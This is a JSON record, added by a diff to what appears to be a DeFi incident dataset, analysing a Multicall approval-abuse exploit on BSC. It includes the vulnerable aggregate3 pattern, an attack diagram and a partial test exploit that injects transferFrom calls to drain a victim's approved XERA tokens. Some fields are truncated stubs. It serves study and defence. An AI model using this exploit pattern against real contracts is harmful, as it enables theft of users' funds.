@@ -1,0 +1,30 @@
+{
+ "id": "2025__2025-08-13_MulticallWithXera_ApprovalAbuse",
+ "source_file": "2025/2025-08-13_MulticallWithXera_ApprovalAbuse.md",
+ "title": "MulticallWithXera — Multicall Approval Abuse Analysis",
+ "date": "2025-08-13",
+ "protocol": "MulticallWithXera",
+ "chain": "BSC",
+ "loss_raw": "~17,000 USD",
+ "loss_usd": null,
+ "root_cause": "Attacker exploited the unlimited approval a victim had granted to the Multicall contract via the `aggregate3` function",
+ "attack_tx": "0xed6fd61c...",
+ "vulnerable_contract": "0x90be00229fe8000000009e007743a485d400c3b7",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: Multicall executes arbitrary calls in its own msg.sender context\n// Multicall contract (0x90be...)\nfunction aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData) {\n    // Executes each call where this contract is the approved spender\n    // If attacker injects transferFrom into calls, it will execute\n    for (uint256 i = 0; i < calls.length; i++) {\n        (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);\n        ...\n    }\n}\n\n// Victim had previously approved:\n// XERA.approve(Multicall, type(uint256).max)\n\n//",
+  "// File: MulticallWithXera_decompiled.sol\ncontract MulticallWithXera {\ncontract MulticallWithXera {  // ❌ Vulnerability\n\n    // Selector: 0x988d2560\n    function unknownFn_988d2560() external  {\n        // TODO: decompile logic not implemented\n    }\n\n    // Selector: 0xefd1fc6a\n    function unknownFn_efd1fc6a() external  {\n        // TODO: decompile logic not implemented\n    }\n\n}"
+ ],
+ "code_after": [
+  "✅ Remediation: Design the system so users do not grant unlimited approvals to Multicall\n// Or restrict Multicall to only execute specific function selectors"
+ ],
+ "steps": [
+  "Multicall = approved spender → succeeds"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ Confirms that the victim's address has granted\n  │         unlimited XERA token approval to the Multicall contract\n  │         (approval was previously granted during normal usage)\n  │\n  ├─[2]─▶ Calls aggregate3\n  │         calls[0] = {\n  │           target: XERA_TOKEN,\n  │           callData: transferFrom(victim, attacker, balance)\n  │         }\n  │\n  ├─[3]─▶ Multicall executes XERA.transferFrom(victim, attacker, ...)\n  │         └─ Multicall = approved spender → succeeds\n  │\n  └─[4]─▶ XERA tokens drained\n              └─ Swapped to BNB via CakeLP",
+  "function testExploit() public balanceLog {\n    // [1] Confirm victim has approved the Multicall contract for XERA tokens\n    // XERA.allowance(victim, multicall) > 0\n\n    // [2] Construct malicious calls array for aggregate3\n    IMulticall.Call3[] memory calls = new IMulticall.Call3[](1);\n    calls[0] = IMulticall.Call3({\n        target: xera,  // XERA token contract\n        allowFailure: false,\n        // Encode transferFrom(victim, attacker, victim_balance)\n        callData: abi.encodeWithSignature(\n            \"transferFrom(address,address,uint256)\",\n            victim,          // from: victim\n            address(this),   // to: attacker\n            IERC20(xera).balanceOf(victim)  // full balance\n        )\n    });\n\n    // [3] Execute Multicall.aggregate3\n    // Multicall is the approve"
+ ]
+}
